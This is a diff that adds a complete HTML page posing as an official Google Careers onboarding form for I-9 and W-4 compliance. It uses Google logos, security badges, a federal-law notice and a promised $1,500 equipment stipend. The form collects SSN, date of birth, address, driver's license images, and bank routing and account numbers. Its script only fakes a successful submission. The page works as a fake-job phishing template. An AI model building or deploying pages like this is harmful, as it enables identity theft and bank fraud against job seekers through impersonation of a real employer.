@@ -1,0 +1,615 @@
+<!--
+  ============================================================
+  Project: Google Onboarding – I-9 & W-4 Compliance Form
+  Description: Optimized, pixel‑perfect implementation.
+  Author: TaskEarn Pro Team
+  License: MIT
+  ============================================================
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google Onboarding – I-9 & W-4</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet" />
+  <style>
+    /* ----- CSS Variables (Optimized) ----- */
+    :root {
+      --bg-body: #f1f3f4;
+      --bg-card: #ffffff;
+      --color-primary: #1a73e8;
+      --color-primary-hover: #1557b0;
+      --color-title: #1a0dab;
+      --color-subtitle: #5f6368;
+      --color-text: #202124;
+      --border-color: #dadce0;
+      --bg-law: #fef7e0;
+      --bg-badges: #f8f9fa;
+      --bg-checkbox: #f8f9fa;
+      --radius: 8px;
+      --font: 'Google Sans', 'Inter', -apple-system, sans-serif;
+      --shadow: 0 8px 28px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.04);
+    }
+
+    /* ----- Reset & Base ----- */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: var(--font);
+      background: var(--bg-body);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .card {
+      max-width: 640px;
+      width: 100%;
+      background: var(--bg-card);
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      transition: box-shadow 0.25s;
+    }
+
+    .card:hover { box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12); }
+
+    /* ----- Header ----- */
+    .header {
+      padding: 28px 30px 16px 30px;
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .header-top {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 4px;
+    }
+
+    .google-logo { flex-shrink: 0; }
+    .google-logo svg { display: block; width: 80px; height: 26px; }
+
+    .header-title {
+      font-size: 24px;
+      font-weight: 500;
+      color: var(--color-title);
+      letter-spacing: -0.3px;
+      line-height: 1.2;
+    }
+
+    .header-subtitle {
+      font-size: 14px;
+      color: var(--color-subtitle);
+      font-weight: 400;
+      margin-top: 2px;
+      letter-spacing: 0.15px;
+    }
+
+    /* ----- Badges ----- */
+    .badges {
+      background: var(--bg-badges);
+      padding: 10px 20px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      gap: 18px 32px;
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .badge-item {
+      font-size: 12px;
+      color: #3c4043;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 500;
+    }
+
+    /* ----- Law Notice ----- */
+    .law-notice {
+      background: var(--bg-law);
+      padding: 12px 24px;
+      font-size: 13px;
+      color: var(--color-text);
+      line-height: 1.5;
+      border-bottom: 1px solid #f1e3b8;
+    }
+
+    .law-notice strong { font-weight: 700; }
+
+    /* ----- Body ----- */
+    .body { padding: 28px 30px 30px; }
+
+    .section-heading {
+      font-size: 16px;
+      font-weight: 500;
+      color: var(--color-text);
+      margin: 24px 0 16px 0;
+      padding-bottom: 6px;
+      border-bottom: 1px solid #e8eaed;
+    }
+
+    .section-heading:first-of-type { margin-top: 0; }
+
+    /* ----- Form Fields (Consolidated) ----- */
+    .form-group { margin-bottom: 18px; }
+
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--color-text);
+      margin-bottom: 4px;
+    }
+
+    .form-group .hint {
+      font-size: 12px;
+      font-weight: 400;
+      color: var(--color-subtitle);
+      margin-left: 4px;
+    }
+
+    .form-group input,
+    .form-group select {
+      width: 100%;
+      padding: 10px 14px;
+      font-size: 14px;
+      font-family: var(--font);
+      color: var(--color-text);
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius);
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .form-group input::placeholder {
+      color: #70757a;
+      font-size: 14px;
+      opacity: 0.6;
+    }
+
+    .form-group input:focus {
+      border-color: var(--color-primary);
+      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+    }
+
+    .form-group input[type="file"] {
+      padding: 8px 0;
+      border: none;
+      font-size: 13px;
+      color: var(--color-text);
+    }
+
+    .file-hint {
+      font-size: 12px;
+      color: var(--color-subtitle);
+      margin-top: 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .field-note {
+      font-size: 12px;
+      color: var(--color-subtitle);
+      margin-top: 6px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .ssn-note {
+      background: var(--bg-badges);
+      border-radius: 6px;
+      padding: 6px 12px;
+      margin-top: 6px;
+      font-size: 12px;
+      color: var(--color-subtitle);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .direct-deposit-note {
+      font-size: 13px;
+      color: var(--color-subtitle);
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* ----- Authorization ----- */
+    .authorization {
+      background: var(--bg-checkbox);
+      border-radius: 10px;
+      padding: 16px 20px;
+      margin: 24px 0 22px 0;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      font-size: 12px;
+      color: var(--color-subtitle);
+      opacity: 0.85;
+      line-height: 1.5;
+    }
+
+    .authorization input[type="checkbox"] {
+      margin-top: 2px;
+      flex-shrink: 0;
+      width: 18px;
+      height: 18px;
+      accent-color: var(--color-primary);
+      cursor: pointer;
+    }
+
+    .authorization label { cursor: pointer; }
+    .authorization label strong {
+      font-weight: 500;
+      color: var(--color-text);
+    }
+
+    /* ----- Button ----- */
+    .btn-primary {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      padding: 16px;
+      background: var(--color-primary);
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: 700;
+      font-family: var(--font);
+      border: none;
+      border-radius: var(--radius);
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+      letter-spacing: 0.2px;
+    }
+
+    .btn-primary:hover {
+      background: var(--color-primary-hover);
+      box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
+    }
+
+    .btn-primary:active { transform: scale(0.98); }
+    .btn-primary:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .btn-primary .spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top: 2px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    .btn-primary.loading .spinner { display: inline-block; }
+    .btn-primary.loading .btn-text { display: none; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ----- Return Link ----- */
+    .return-link {
+      display: block;
+      text-align: center;
+      margin-top: 18px;
+      font-size: 11px;
+    }
+
+    .return-link a {
+      color: var(--color-primary);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .return-link a:hover { text-decoration: underline; }
+
+    /* ----- Toast ----- */
+    .toast {
+      display: none;
+      margin-top: 18px;
+      padding: 12px 16px;
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 500;
+      text-align: center;
+      transition: opacity 0.3s;
+    }
+
+    .toast.success {
+      display: block;
+      background: #e6f4ea;
+      color: #1e8e3e;
+      border: 1px solid #b7e1cd;
+    }
+
+    .toast.error {
+      display: block;
+      background: #fce8e6;
+      color: #d93025;
+      border: 1px solid #f5d4d0;
+    }
+
+    /* ----- Responsive ----- */
+    @media (max-width: 550px) {
+      .header { padding: 18px 18px 12px; }
+      .header-title { font-size: 20px; }
+      .header-subtitle { font-size: 12px; }
+      .body { padding: 18px; }
+      .badges { gap: 12px 20px; padding: 8px 16px; }
+      .law-notice { font-size: 12px; padding: 10px 16px; }
+      .section-heading { font-size: 15px; }
+      .btn-primary { font-size: 16px; padding: 14px; }
+      .authorization { font-size: 11px; padding: 14px 16px; }
+      .return-link { font-size: 10px; }
+    }
+
+    @media (max-width: 400px) {
+      .header-top { flex-wrap: wrap; gap: 8px; }
+      .google-logo svg { width: 64px; height: 22px; }
+      .header-title { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="card" role="main" aria-label="Google Onboarding I-9 & W-4 Form">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="header-top">
+      <span class="google-logo" aria-hidden="true">
+        <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M37.4 12c0 4.7-3.6 8.5-8.1 8.5-4.5 0-8.2-3.8-8.2-8.5S24.8 3.5 29.3 3.5c4.5 0 8.1 3.8 8.1 8.5z" />
+          <path fill="#34A853" d="M49.2 12c0 4.7-3.6 8.5-8.1 8.5-4.5 0-8.2-3.8-8.2-8.5S36.6 3.5 41.1 3.5c4.5 0 8.1 3.8 8.1 8.5z" />
+          <path fill="#FBBC05" d="M61 12c0 4.7-3.6 8.5-8.1 8.5-4.5 0-8.2-3.8-8.2-8.5S48.4 3.5 52.9 3.5c4.5 0 8.1 3.8 8.1 8.5z" />
+          <path fill="#EA4335" d="M72.8 12c0 4.7-3.6 8.5-8.1 8.5-4.5 0-8.2-3.8-8.2-8.5S60.2 3.5 64.7 3.5c4.5 0 8.1 3.8 8.1 8.5z" />
+          <path fill="#4285F4" d="M0 12.4c0-2.1.8-4 2.2-5.4l2.6 2.6c-.5.8-.8 1.8-.8 2.8s.3 2 .8 2.8L2.2 17.8C.8 16.4 0 14.5 0 12.4z" />
+          <path fill="#34A853" d="M12.2 6.2c1.6 0 3.1.6 4.2 1.5l3-3C17.5 2.8 15.1 1.5 12.2 1.5 8.5 1.5 5.3 3.6 3.8 6.7l3.4 2.8c.8-1.7 2.5-3.3 5-3.3z" />
+          <path fill="#FBBC05" d="M7.2 14.1c-.4-.8-.6-1.7-.6-2.7s.2-1.9.6-2.7L3.8 6.7C2.8 8.4 2.2 10.3 2.2 12.4s.6 4 1.6 5.7l3.4-2.8z" />
+          <path fill="#EA4335" d="M12.2 18.5c-2.5 0-4.2-1.6-5-3.3L3.8 17.8c1.5 3.1 4.7 5.2 8.4 5.2 3 0 5.4-1.1 7.3-2.8l-3.2-2.8c-1 .8-2.6 1.1-4.1 1.1z" />
+        </svg>
+      </span>
+      <span class="header-title">Google Careers Hub</span>
+    </div>
+    <div class="header-subtitle">Official Onboarding – I-9 &amp; W-4 Compliance</div>
+  </div>
+
+  <!-- BADGES -->
+  <div class="badges">
+    <span class="badge-item">🔒 256-bit SSL</span>
+    <span class="badge-item">✅ E-Verify</span>
+    <span class="badge-item">📄 Privacy Act 1974</span>
+  </div>
+
+  <!-- FEDERAL LAW NOTICE -->
+  <div class="law-notice">
+    <strong>📋 Federal Law (8 U.S.C. § 1324a)</strong> requires us to verify your identity and employment eligibility. This form collects the necessary information for I-9 and W-4 compliance.
+  </div>
+
+  <!-- BODY -->
+  <div class="body">
+
+    <!-- Section 1 -->
+    <div class="section-heading">Section 1: Identity &amp; Work Authorization</div>
+
+    <div class="form-group">
+      <label for="fullName">Full Legal Name <span class="hint">(As shown on your SSN card)</span></label>
+      <input type="text" id="fullName" placeholder="e.g., John Michael Doe" autocomplete="name" required />
+    </div>
+
+    <div class="form-group">
+      <label for="dob">Date of Birth</label>
+      <input type="text" id="dob" placeholder="MM/DD/YYYY" autocomplete="bday" required />
+    </div>
+
+    <div class="form-group">
+      <label for="address">Address <span class="hint">(Street, City, State, ZIP)</span></label>
+      <input type="text" id="address" placeholder="e.g., 123 Main St, Mountain View, CA 94043" autocomplete="address-line1" required />
+    </div>
+
+    <div class="form-group">
+      <label for="ssn">Social Security Number (SSN)</label>
+      <input type="text" id="ssn" placeholder="XXX-XX-XXXX" pattern="\d{3}-\d{2}-\d{4}" aria-describedby="ssn-note" required />
+      <div class="ssn-note" id="ssn-note">🔒 Required for Federal Tax Withholding (W-4) and IRS.</div>
+    </div>
+
+    <div class="form-group">
+      <label for="licenseUpload">Upload Driver’s License <span class="hint">(Front &amp; Back)</span></label>
+      <input type="file" id="licenseUpload" accept="image/*,application/pdf" multiple />
+      <div class="file-hint">📄 Required for USCIS I-9 &amp; E-Verify.</div>
+    </div>
+
+    <!-- Section 2 -->
+    <div class="section-heading">Section 2: Direct Deposit – Payroll &amp; Equipment Stipend</div>
+
+    <div class="direct-deposit-note">💵 Your $1,500 equipment stipend &amp; paychecks go here.</div>
+
+    <div class="form-group">
+      <label for="bankName">Bank Name</label>
+      <input type="text" id="bankName" placeholder="e.g., Varo, Chase, Wells Fargo" autocomplete="organization" required />
+    </div>
+
+    <div class="form-group">
+      <label for="routing">Routing Number</label>
+      <input type="text" id="routing" placeholder="e.g., 021000021" autocomplete="off" required />
+    </div>
+
+    <div class="form-group">
+      <label for="account">Account Number</label>
+      <input type="text" id="account" placeholder="e.g., 123456789" autocomplete="off" required />
+    </div>
+
+    <div class="form-group">
+      <label for="confirmAccount">Confirm Account</label>
+      <input type="text" id="confirmAccount" placeholder="Re‑type account number" autocomplete="off" required />
+    </div>
+
+    <!-- Authorization -->
+    <div class="authorization">
+      <input type="checkbox" id="authorizeCheck" required />
+      <label for="authorizeCheck">
+        <strong>I authorize Google</strong> to verify my identity through USCIS E-Verify and run a standard employment background check. By submitting, you confirm all information is accurate.
+      </label>
+    </div>
+
+    <!-- Submit -->
+    <button class="btn-primary" id="submitBtn">
+      <span class="btn-text">✅ Submit &amp; Finalize Offer</span>
+      <span class="spinner"></span>
+    </button>
+
+    <div class="toast" id="toast"></div>
+
+    <div class="return-link">
+      <a href="https://www.google.com/about/careers/" target="_blank">&lt; Return to Google Careers</a>
+    </div>
+
+  </div>
+</div>
+
+<!-- ===== JAVASCRIPT (Optimized) ===== -->
+<script>
+  (function() {
+    'use strict';
+
+    const btn = document.getElementById('submitBtn');
+    const toast = document.getElementById('toast');
+
+    // Single object for all fields
+    const fields = {
+      fullName: document.getElementById('fullName'),
+      dob: document.getElementById('dob'),
+      address: document.getElementById('address'),
+      ssn: document.getElementById('ssn'),
+      license: document.getElementById('licenseUpload'),
+      bankName: document.getElementById('bankName'),
+      routing: document.getElementById('routing'),
+      account: document.getElementById('account'),
+      confirmAccount: document.getElementById('confirmAccount'),
+      authorize: document.getElementById('authorizeCheck'),
+    };
+
+    // Helper: show toast
+    function showToast(message, type = 'success') {
+      toast.textContent = message;
+      toast.className = `toast ${type}`;
+      clearTimeout(toast._timer);
+      toast._timer = setTimeout(() => { toast.className = 'toast'; }, 5000);
+    }
+
+    // Validation logic (clean and focused)
+    function validateForm() {
+      const {
+        fullName, dob, address, ssn, bankName, routing, account, confirmAccount, authorize
+      } = fields;
+
+      // Required fields check (using a list to avoid repetition)
+      const required = [
+        { el: fullName, msg: 'Please enter your full legal name.' },
+        { el: dob, msg: 'Please enter your date of birth.' },
+        { el: address, msg: 'Please enter your address.' },
+        { el: ssn, msg: 'Please enter your SSN.' },
+        { el: bankName, msg: 'Please enter your bank name.' },
+        { el: routing, msg: 'Please enter your routing number.' },
+        { el: account, msg: 'Please enter your account number.' },
+        { el: confirmAccount, msg: 'Please confirm your account number.' },
+      ];
+
+      for (const field of required) {
+        if (!field.el.value.trim()) {
+          showToast(field.msg, 'error');
+          field.el.focus();
+          return false;
+        }
+      }
+
+      // SSN format
+      if (!/^\d{3}-\d{2}-\d{4}$/.test(ssn.value.trim())) {
+        showToast('Please enter SSN in the format XXX-XX-XXXX.', 'error');
+        ssn.focus();
+        return false;
+      }
+
+      // Account number match
+      if (account.value.trim() !== confirmAccount.value.trim()) {
+        showToast('Account numbers do not match. Please re‑enter.', 'error');
+        confirmAccount.focus();
+        return false;
+      }
+
+      // Authorization checkbox
+      if (!authorize.checked) {
+        showToast('You must authorize the verification and background check.', 'error');
+        authorize.focus();
+        return false;
+      }
+
+      return true;
+    }
+
+    // Submit handler
+    function submitForm() {
+      if (!validateForm()) return;
+
+      btn.disabled = true;
+      btn.classList.add('loading');
+
+      // Simulate async submission
+      const delay = 1800 + Math.random() * 800;
+      setTimeout(() => {
+        btn.disabled = false;
+        btn.classList.remove('loading');
+        const name = fields.fullName.value.trim();
+        showToast(
+          `✅ ${name}, your onboarding has been submitted successfully! You will receive your equipment stipend and next steps within 24 hours.`,
+          'success'
+        );
+        // Optionally reset form here (commented to keep data visible)
+        // Object.values(fields).forEach(f => { if (f.type !== 'file' && f.type !== 'checkbox') f.value = ''; });
+        // fields.authorize.checked = false;
+        // fields.license.value = '';
+      }, delay);
+    }
+
+    // Event listeners
+    btn.addEventListener('click', submitForm);
+
+    // Enter key on any input triggers submit
+    document.querySelectorAll('input').forEach(el => {
+      el.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          submitForm();
+        }
+      });
+    });
+
+    // Auto‑dismiss toast on any click
+    document.addEventListener('click', () => {
+      if (toast.className.includes('toast')) {
+        clearTimeout(toast._timer);
+        toast.className = 'toast';
+      }
+    });
+  })();
+</script>
+
+</body>
+</html>
